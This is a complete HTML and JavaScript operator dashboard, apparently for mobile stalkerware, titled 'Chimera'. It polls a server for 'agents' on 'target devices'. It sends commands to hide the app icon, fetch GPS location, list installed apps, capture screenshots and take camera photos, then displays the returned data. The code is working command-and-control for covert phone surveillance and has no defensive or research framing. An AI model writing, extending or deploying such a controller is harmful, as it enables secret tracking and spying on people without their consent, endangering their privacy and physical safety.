<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chimera Dashboard</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #0f172a;
            --bg-secondary: #1e293b;
            --bg-tertiary: #334155;
            --bg-accent: rgba(56, 182, 255, 0.1);
            --border-color: rgba(148, 163, 184, 0.1);
            --border-accent: rgba(56, 182, 255, 0.3);
            --text-primary: #f8fafc;
            --text-secondary: #94a3b8;
            --text-tertiary: #64748b;
            --accent-blue: #38b6ff;
            --accent-green: #4ade80;
            --accent-red: #f87171;
            --accent-purple: #a78bfa;
            --font-sans: 'Inter', sans-serif;
            --sidebar-width: 280px;
            --border-radius: 12px;
            --transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
        }
        
        * { 
            box-sizing: border-box; 
            margin: 0;
            padding: 0;
        }
        
        body {
            background-color: var(--bg-primary);
            color: var(--text-primary);
            font-family: var(--font-sans);
            margin: 0;
            height: 100vh;
            overflow: hidden;
            -webkit-font-smoothing: antialiased;
        }
        
        .app-layout { 
            display: grid; 
            grid-template-columns: var(--sidebar-width) 1fr; 
            height: 100vh; 
        }

        /* --- Sidebar --- */
        .sidebar {
            background-color: var(--bg-primary);
            border-right: 1px solid var(--border-color);
            display: flex; 
            flex-direction: column; 
            padding: 24px 16px;
            position: relative;
            z-index: 10;
        }
        
        .sidebar-header {
            display: flex;
            align-items: center;
            gap: 12px;
            font-weight: 700; 
            font-size: 1.25rem; 
            letter-spacing: 0.05em;
            margin: 0 0 32px 8px; 
            color: var(--text-primary);
            padding: 8px 12px;
        }
        
        .sidebar-header::before {
            content: '';
            display: block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: var(--accent-blue);
            box-shadow: 0 0 0 2px rgba(56, 182, 255, 0.3);
        }
        
        #device-list { 
            list-style: none; 
            padding: 0; 
            margin: 0; 
            overflow-y: auto; 
            flex-grow: 1;
        }
        
        #device-list li {
            display: flex; 
            align-items: center; 
            gap: 12px;
            padding: 12px 16px; 
            border-radius: var(--border-radius); 
            cursor: pointer;
            margin-bottom: 4px; 
            transition: var(--transition);
            position: relative;
        }
        
        #device-list li:hover { 
            background-color: var(--bg-secondary); 
        }
        
        #device-list li.selected { 
            background-color: var(--bg-accent); 
            color: var(--accent-blue);
            border-left: 2px solid var(--accent-blue);
        }
        
        #device-list li.selected .device-icon {
            color: var(--accent-blue);
        }
        
        #device-list li::after {
            content: '';
            position: absolute;
            bottom: -2px;
            left: 16px;
            right: 16px;
            height: 1px;
            background: var(--border-color);
        }
        
        #device-list li:last-child::after {
            display: none;
        }
        
        .device-icon { 
            flex-shrink: 0; 
            color: var(--text-secondary);
            transition: var(--transition);
        }
        
        .device-id {
            white-space: nowrap; 
            overflow: hidden; 
            text-overflow: ellipsis;
            font-size: 0.875rem; 
            font-weight: 500;
        }
        
        .device-status {
            margin-left: auto;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: var(--accent-green);
            box-shadow: 0 0 0 2px rgba(74, 222, 128, 0.3);
        }

        /* --- Main Content --- */
        .main-content { 
            display: flex; 
            flex-direction: column; 
            height: 100vh; 
            overflow: hidden; 
            background-color: var(--bg-secondary);
        }
        
        .main-view { 
            flex-grow: 1; 
            padding: 32px; 
            overflow-y: auto; 
        }
        
        .main-header { 
            margin-bottom: 32px; 
        }
        
        .main-header h1 { 
            margin: 0; 
            font-size: 1.75rem; 
            font-weight: 600;
            letter-spacing: -0.025em;
        }
        
        .main-header p { 
            margin: 8px 0 0; 
            color: var(--text-secondary); 
            font-size: 0.9375rem;
        }
        
        .command-card-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 24px;
        }
        
        .command-card {
            background-color: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: var(--border-radius); 
            padding: 24px;
            transition: var(--transition);
        }
        
        .command-card:hover {
            border-color: var(--border-accent);
            transform: translateY(-2px);
        }
        
        .card-header {
            display: flex; 
            align-items: center; 
            gap: 12px;
            margin-bottom: 20px; 
            padding-bottom: 16px;
            border-bottom: 1px solid var(--border-color);
        }
        
        .card-header h3 { 
            margin: 0; 
            font-size: 1.125rem; 
            font-weight: 600;
            letter-spacing: -0.01em;
        }
        
        .card-body {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        
        .card-body button {
            width: 100%; 
            padding: 12px 16px; 
            background-color: transparent;
            border: 1px solid var(--border-color); 
            color: var(--text-primary);
            border-radius: 8px; 
            cursor: pointer; 
            font-size: 0.9375rem; 
            font-weight: 500;
            transition: var(--transition);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .card-body button:hover:enabled { 
            background-color: var(--bg-accent); 
            border-color: var(--accent-blue); 
            color: var(--accent-blue);
        }
        
        .card-body button:disabled { 
            cursor: not-allowed; 
            opacity: 0.5; 
        }
        
        .card-body button svg {
            width: 16px;
            height: 16px;
        }

        /* --- Console --- */
        .console {
            flex-shrink: 0; 
            height: 30%; 
            max-height: 300px;
            background-color: var(--bg-primary);
            border-top: 1px solid var(--border-color); 
            padding: 16px;
            overflow-y: auto; 
            resize: vertical; 
            font-family: 'SF Mono', 'Roboto Mono', monospace;
            font-size: 0.8125rem;
        }
        
        .console-entry { 
            display: flex; 
            line-height: 1.6; 
            margin-bottom: 8px;
        }
        
        .console-entry .timestamp { 
            color: var(--text-tertiary); 
            margin-right: 1em; 
            white-space: nowrap; 
            flex-shrink: 0;
        }
        
        .console-cmd .message { 
            color: var(--accent-blue); 
            font-weight: 500;
        }
        
        .console-success .message { 
            color: var(--accent-green); 
        }
        
        .console-error .message { 
            color: var(--accent-red); 
        }

        /* --- Modal --- */
        .modal-overlay {
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%;
            background-color: rgba(15, 23, 42, 0.9);
            display: flex; 
            align-items: center; 
            justify-content: center;
            backdrop-filter: blur(10px); 
            z-index: 1000;
            opacity: 0; 
            visibility: hidden; 
            transition: var(--transition);
        }
        
        .modal-overlay.visible { 
            opacity: 1; 
            visibility: visible; 
        }
        
        .modal-content {
            background-color: var(--bg-primary);
            border-radius: var(--border-radius); 
            padding: 32px;
            width: 90vw; 
            max-width: 800px;
            max-height: 90vh;
            border: 1px solid var(--border-color);
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
            overflow-y: auto;
            transform: translateY(10px);
            transition: var(--transition);
        }
        
        .modal-overlay.visible .modal-content {
            transform: translateY(0);
        }
        
        .modal-header { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            margin-bottom: 24px; 
        }
        
        .modal-header h2 { 
            margin: 0; 
            font-size: 1.5rem;
            font-weight: 600;
        }
        
        .modal-close-btn { 
            background: none; 
            border: none; 
            color: var(--text-secondary); 
            cursor: pointer; 
            padding: 8px; 
            border-radius: 6px;
            transition: var(--transition);
        }
        
        .modal-close-btn:hover {
            background: var(--bg-secondary);
            color: var(--text-primary);
        }
        
        .modal-body { 
            line-height: 1.6;
        }
        
        .modal-body img { 
            max-width: 100%; 
            height: auto; 
            border-radius: var(--border-radius); 
            border: 1px solid var(--border-color);
            margin-bottom: 16px;
        }
        
        .modal-body pre { 
            background-color: var(--bg-secondary); 
            padding: 16px; 
            border-radius: var(--border-radius); 
            font-size: 0.875rem;
            overflow-x: auto;
            border: 1px solid var(--border-color);
        }
        
        .modal-body a { 
            display: inline-flex;
            align-items: center;
            gap: 8px;
            color: var(--accent-blue); 
            font-size: 0.9375rem; 
            text-decoration: none;
            margin-bottom: 16px;
            padding: 8px 12px;
            border-radius: 6px;
            transition: var(--transition);
        }
        
        .modal-body a:hover {
            background: var(--bg-accent);
        }
        
        /* Empty State */
        .empty-state {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 60vh;
            text-align: center;
            color: var(--text-secondary);
        }
        
        .empty-state svg {
            width: 64px;
            height: 64px;
            margin-bottom: 24px;
            color: var(--text-tertiary);
        }
        
        .empty-state h2 {
            font-size: 1.5rem;
            margin-bottom: 12px;
            color: var(--text-primary);
        }
        
        .empty-state p {
            max-width: 400px;
            line-height: 1.6;
        }
        
        /* Animations */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .fade-in {
            animation: fadeIn 0.3s ease-out forwards;
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: var(--bg-primary);
        }
        
        ::-webkit-scrollbar-thumb {
            background: var(--bg-tertiary);
            border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: var(--text-tertiary);
        }
    </style>
</head>
<body>
    <div class="app-layout">
        <aside class="sidebar">
            <h2 class="sidebar-header">CHIMERA</h2>
            <ul id="device-list"></ul>
        </aside>

        <main class="main-content">
            <div class="main-view" id="main-view">
                <!-- Initial state / Device Dashboard is rendered here -->
            </div>
            <div class="console" id="console"></div>
        </main>
    </div>

    <div class="modal-overlay" id="modal-overlay">
        <div class="modal-content">
            <div class="modal-header">
                <h2 id="modal-title">Data Received</h2>
                <button class="modal-close-btn" id="modal-close-btn">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
                </button>
            </div>
            <div class="modal-body" id="modal-body"></div>
        </div>
    </div>
    
    <script>
        // --- DOM Elements ---
        const deviceList = document.getElementById('device-list');
        const consoleOutput = document.getElementById('console');
        const mainView = document.getElementById('main-view');
        const modalOverlay = document.getElementById('modal-overlay');
        const modalTitle = document.getElementById('modal-title');
        const modalBody = document.getElementById('modal-body');
        const modalCloseBtn = document.getElementById('modal-close-btn');

        // --- State ---
        const API_BASE = '/.netlify/functions';
        let devices = [];
        let selectedDevice = null;

        // --- SVG Icons ---
        const ICONS = {
            device: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>`,
            stealth: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5"></path><path d="M8.5 8.5v.01"></path><path d="M16 15.5v.01"></path><path d="M12 12v.01"></path><path d="M11 17v.01"></path><path d="M7 14v.01"></path></svg>`,
            recon: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line><line x1="11" y1="8" x2="11" y2="14"></line><line x1="8" y1="11" x2="14" y2="11"></line></svg>`,
            surveillance: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>`,
            empty: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="12" x2="2" y2="12"></line><path d="M5.45 5.11L2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z"></path><line x1="6" y1="16" x2="6.01" y2="16"></line><line x1="10" y1="16" x2="10.01" y2="16"></line></svg>`,
            command: `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 3a3 3 0 0 0-3 3v12a3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3H6a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3V6a3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3h12a3 3 0 0 0 3-3 3 3 0 0 0-3-3z"></path></svg>`,
            location: `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>`,
            apps: `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="6" height="6" rx="1"></rect><rect x="14" y="4" width="6" height="6" rx="1"></rect><rect x="4" y="14" width="6" height="6" rx="1"></rect><rect x="14" y="14" width="6" height="6" rx="1"></rect></svg>`,
            screenshot: `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>`,
            camera: `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg>`,
            hide: `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>`,
            show: `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>`
        };

        // --- Core Functions ---
        const log = (message, type = 'info') => {
            const timestamp = new Date().toLocaleTimeString();
            const entry = document.createElement('div');
            entry.className = `console-entry console-${type} fade-in`;
            entry.innerHTML = `<span class="timestamp">${timestamp}</span><span class="message">${message}</span>`;
            consoleOutput.appendChild(entry);
            consoleOutput.scrollTop = consoleOutput.scrollHeight;
        };

        const fetchDevices = async () => {
            log('Querying for active agents...');
            try {
                const response = await fetch(`${API_BASE}/get-devices`);
                if (!response.ok) throw new Error(`Server responded with ${response.status}`);
                devices = await response.json();
                renderDeviceList();
                log(`Found ${devices.length} agents.`, 'success');
                if (devices.length > 0) {
                    selectDevice(devices[0]);
                } else {
                    renderEmptyState();
                }
            } catch (error) { 
                log(`Error fetching agents: ${error.message}`, 'error'); 
            }
        };

        const sendCommand = async (action, payload = {}) => {
            if (!selectedDevice) return log('Cannot send command: No target selected.', 'error');
            const commandPayload = { token: selectedDevice.token, action, ...payload };
            log(`Transmitting [${action}] to target...`, 'cmd');
            try {
                const response = await fetch(`${API_BASE}/send-command`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(commandPayload)
                });
                const result = await response.json();
                if (!response.ok) throw new Error(result.error || `Server responded with ${response.status}`);
                log(`Command [${action}] transmitted. Awaiting data...`, 'success');
                setTimeout(fetchDeviceData, 5000);
            } catch (error) { 
                log(`Command transmission failed: ${error.message}`, 'error'); 
            }
        };

        const fetchDeviceData = async () => {
            if (!selectedDevice) return log('Cannot fetch data: No target selected.', 'error');
            log('Querying for new data from target...');
             try {
                const response = await fetch(`${API_BASE}/get-device-data?deviceId=${selectedDevice.deviceId}`);
                if (!response.ok) throw new Error(`Server responded with ${response.status}`);
                const data = await response.json();
                if(data.length === 0) return log('No new data received.');
                
                log(`Received ${data.length} new data packets.`, 'success');
                let mostRecentFormattedItem = null;
                data.forEach(item => {
                    if (['location', 'screenshot', 'list_apps'].includes(item.dataType)) {
                        mostRecentFormattedItem = item;
                    }
                });
                if(mostRecentFormattedItem) renderModal(mostRecentFormattedItem);
            } catch (error) { 
                log(`Error fetching data: ${error.message}`, 'error'); 
            }
        };
        
        // --- UI Rendering ---
        const renderDeviceList = () => {
            deviceList.innerHTML = devices.map(device => `
                <li data-device-id="${device.deviceId}">
                    <span class="device-icon">${ICONS.device}</span>
                    <span class="device-id">${device.deviceId}</span>
                    <span class="device-status"></span>
                </li>
            `).join('');
        };

        const renderEmptyState = () => {
            mainView.innerHTML = `
                <div class="empty-state">
                    ${ICONS.empty}
                    <h2>No Agents Online</h2>
                    <p>Activate an agent on a target device to begin surveillance operations.</p>
                </div>`;
        };
        
        const renderDashboard = (device) => {
            mainView.innerHTML = `
                <div class="main-header">
                    <h1>Agent Dashboard</h1>
                    <p>Connected to device: <span style="color: var(--accent-blue); font-family: monospace;">${device.deviceId}</span></p>
                </div>
                <div class="command-card-grid">
                    <div class="command-card">
                        <div class="card-header"> ${ICONS.stealth} <h3>Stealth Operations</h3> </div>
                        <div class="card-body">
                            <button data-command="toggle_icon" data-payload='{"show": "false"}'>
                                ${ICONS.hide} Hide Icon
                            </button>
                            <button data-command="toggle_icon" data-payload='{"show": "true"}'>
                                ${ICONS.show} Show Icon
                            </button>
                        </div>
                    </div>
                    <div class="command-card">
                        <div class="card-header"> ${ICONS.recon} <h3>Reconnaissance</h3> </div>
                        <div class="card-body">
                            <button data-command="get_location">
                                ${ICONS.location} Get Location
                            </button>
                            <button data-command="list_apps">
                                ${ICONS.apps} List Installed Apps
                            </button>
                        </div>
                    </div>
                    <div class="command-card">
                        <div class="card-header"> ${ICONS.surveillance} <h3>Surveillance</h3> </div>
                        <div class="card-body">
                            <button data-command="screenshot">
                                ${ICONS.screenshot} Take Screenshot
                            </button>
                            <button data-command="picture" data-payload='{"camera_id": "0"}'>
                                ${ICONS.camera} Take Picture (Back Camera)
                            </button>
                        </div>
                    </div>
                </div>`;
        };

        const renderModal = (item) => {
            modalTitle.textContent = `Data Received: ${item.dataType.toUpperCase()}`;
            let content = ``;
            if (item.dataType === 'location') {
                const { latitude, longitude } = item.payload;
                content = `
                    <a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank">
                        ${ICONS.location} Open Location on Google Maps
                    </a>
                    <pre>${JSON.stringify(item.payload, null, 2)}</pre>`;
            } else if (item.dataType === 'screenshot') {
                content = `<img src="data:image/jpeg;base64,${item.payload}" alt="Screenshot">`;
            } else {
                 content = `<pre>${JSON.stringify(item.payload, null, 2)}</pre>`;
            }
            modalBody.innerHTML = content;
            modalOverlay.classList.add('visible');
        };

        // --- Event Handlers ---
        const selectDevice = (device) => {
            selectedDevice = device;
            document.querySelectorAll('#device-list li').forEach(li => {
                li.classList.toggle('selected', li.dataset.deviceId === device.deviceId);
            });
            renderDashboard(device);
        };
        
        deviceList.addEventListener('click', (e) => {
            const li = e.target.closest('li');
            if(li) {
                const device = devices.find(d => d.deviceId === li.dataset.deviceId);
                if(device) selectDevice(device);
            }
        });

        mainView.addEventListener('click', (e) => {
            const button = e.target.closest('button[data-command]');
            if(button) {
                button.disabled = true;
                const command = button.dataset.command;
                const payload = button.dataset.payload ? JSON.parse(button.dataset.payload) : {};
                sendCommand(command, payload);
                setTimeout(() => {
                    button.disabled = false;
                }, 3000);
            }
        });

        modalCloseBtn.addEventListener('click', () => modalOverlay.classList.remove('visible'));
        modalOverlay.addEventListener('click', (e) => {
            if(e.target === modalOverlay) modalOverlay.classList.remove('visible');
        });

        // --- Initial Load ---
        window.onload = () => {
            log('Chimera Dashboard Initialized.');
            renderEmptyState();
            fetchDevices();
            
            // Simulate periodic device refresh
            setInterval(fetchDevices, 30000);
        };
    </script>
</body>
</html>
